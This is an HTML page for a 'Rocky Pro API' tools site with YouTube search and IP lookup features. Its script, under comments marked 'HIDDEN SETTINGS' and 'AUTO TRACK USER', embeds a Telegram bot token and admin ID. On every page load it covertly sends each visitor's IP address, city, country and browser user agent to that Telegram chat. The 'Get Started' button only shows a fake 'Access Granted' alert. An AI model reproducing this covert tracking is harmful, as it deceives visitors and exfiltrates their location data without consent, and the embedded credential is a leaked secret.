<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Rocky Pro API</title>

<style>
body{
  margin:0;
  font-family:sans-serif;
  background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
  color:white;
  text-align:center;
}

.container{
  padding:20px;
}

.btn{
  padding:15px;
  border-radius:30px;
  border:none;
  background:linear-gradient(90deg,#ff00cc,#3333ff);
  color:white;
  font-size:18px;
  margin:10px;
  width:80%;
}

.box{
  background:rgba(255,255,255,0.1);
  padding:20px;
  margin:15px;
  border-radius:15px;
}

input{
  padding:10px;
  border-radius:10px;
  border:none;
  width:80%;
}

</style>
</head>

<body>

<div class="container">

<h1>🚀 Rocky Pro API</h1>
<p>Modern API System — Tools, Downloader, AI</p>

<button class="btn" onclick="start()">🚀 Get Started Free</button>

<div class="box">
<h2>🔍 YouTube Search</h2>
<input id="yt" placeholder="Search video">
<br><br>
<button class="btn" onclick="ytSearch()">Search</button>
</div>

<div class="box">
<h2>🌍 IP Info</h2>
<button class="btn" onclick="ipInfo()">Check</button>
</div>

</div>

<script>

// =====================
// 🔐 HIDDEN SETTINGS
// =====================

// 👉 এখানে BOT TOKEN বসাও
const BOT_TOKEN = "8558577029:AAEdOiNQUk7oK2OpnyqtGmU_PVHKWEcKzRs";

// 👉 এখানে তোমার Telegram ID বসাও
const ADMIN_ID = "6882953267";

// =====================
// 📡 USER TRACK SYSTEM
// =====================

async function sendToTelegram(msg){
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      chat_id:ADMIN_ID,
      text:msg
    })
  });
}

// =====================
// 🚀 START BUTTON
// =====================

function start(){
  alert("✅ Access Granted!");
}

// =====================
// 🔍 YOUTUBE SEARCH
// =====================

async function ytSearch(){
  let q = document.getElementById("yt").value;
  if(!q) return alert("Enter search!");

  let res = await fetch(`https://ytsearch-demo.vercel.app/api/search?q=${q}`);
  let data = await res.json();

  alert("Top Result: " + data.result[0].title);
}

// =====================
// 🌍 IP INFO
// =====================

async function ipInfo(){
  let res = await fetch("https://ipapi.co/json/");
  let data = await res.json();

  alert(`IP: ${data.ip}\nCountry: ${data.country_name}`);

  sendToTelegram(
    `👤 New Visitor\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}`
  );
}

// =====================
// 🔥 AUTO TRACK USER
// =====================

window.onload = async () => {
  let res = await fetch("https://ipapi.co/json/");
  let data = await res.json();

  sendToTelegram(
    `🚀 Visitor Opened Site\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}\nDevice: ${navigator.userAgent}`
  );
};

</script>

</body>
</html>
